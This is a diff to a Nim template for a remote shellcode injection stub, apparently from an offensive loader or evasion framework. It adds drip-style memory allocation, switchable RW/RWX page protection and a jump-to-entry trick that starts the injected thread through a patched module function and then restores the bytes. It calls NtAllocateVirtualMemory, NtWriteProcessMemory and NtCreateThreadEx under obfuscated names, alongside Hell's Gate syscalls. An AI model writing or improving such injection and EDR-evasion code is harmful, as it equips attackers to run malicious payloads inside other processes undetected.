@@ -233,22 +233,47 @@ let ShellcoderemoteinjectStub * = """
 
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
-
-            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
-            when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
-            var bytesWritten: SIZE_T
             
-            ptrEncText = cast[ptr byte](addr encText[0])
-            ptrDecText = cast[ptr byte](addr decText[0])
-            decryptlate()
 
-            status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
+            when defined(AllocateDripStyle):
+                ds = DripAllocate(tProcess, cast[SIZE_T](friendlycode.len), friendlycode)
+                if ds == nil:
+                    when defined(verbose):
+                        echo obf("[-] DripAllocation Failed")
+                    quit(1)
+                else:
+                    when defined(verbose):
+                        echo obf("[+] DripAllocation Success!")
+            else:
+                var protectionValue: DWORD = PAGE_EXECUTE_READWRITE        
+                when defined(RX):
+                    protectionValue = PAGE_READWRITE
+                when defined(RWX):
+                    protectionValue = PAGE_EXECUTE_READWRITE
+                status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
+                when defined(verbose):
+                    echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+                var bytesWritten: SIZE_T
+                
+                ptrEncText = cast[ptr byte](addr encText[0])
+                ptrDecText = cast[ptr byte](addr decText[0])
+                decryptlate()
 
-            when defined(verbose):
-                echo obf("[*] NtWriteProcessMemory: "), toHex(status)
-                echo obf("    \\-- bytes written: "), bytesWritten
-                echo obf("")
+                status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
+
+                when defined(verbose):
+                    echo obf("[*] NtWriteProcessMemory: "), toHex(status)
+                    echo obf("    \\-- bytes written: "), bytesWritten
+                    echo obf("")
+            
+            when defined(JmpEntry):
+                var newEntry: LPVOID
+                newEntry = prepEntry(tProcess, ds, jmpMod, jmpFunc)
+                when defined(verbose):
+                    echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry)), "\r\n"
+            
+            when defined(JmpEntry):
+                    ds = newEntry
             
             when defined(RX):
                 when defined(sleepinbetween):
@@ -273,6 +298,16 @@ let ShellcoderemoteinjectStub * = """
             status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,ds,NULL, FALSE, 0, 0, 0, NULL)
             when defined(verbose):
                 echo obf("[*] NtCreateThreadEx: "), toHex(status)
+            
+            when defined(JmpEntry):
+                Sleep(1000)
+                if(restoreBytes(tProcess, ds)):
+                    when defined(verbose):
+                        echo obf("[*] Restored bytes!")
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to restore bytes!")
+            
             status = zuatzuastdiasyy(tHandle)
             status = zuatzuastdiasyy(tProcess)
  
@@ -325,7 +360,7 @@ let ShellcoderemoteinjectStub * = """
                 var newEntry: LPVOID
                 newEntry = prepEntry(tProcess, ds, jmpMod, jmpFunc)
                 when defined(verbose):
-                    echo obf("[*] New Entry Point: ")
+                    echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry)), "\r\n"
 
             when defined(Hellsgate):
                 if getSyscall(ntWriteTable):
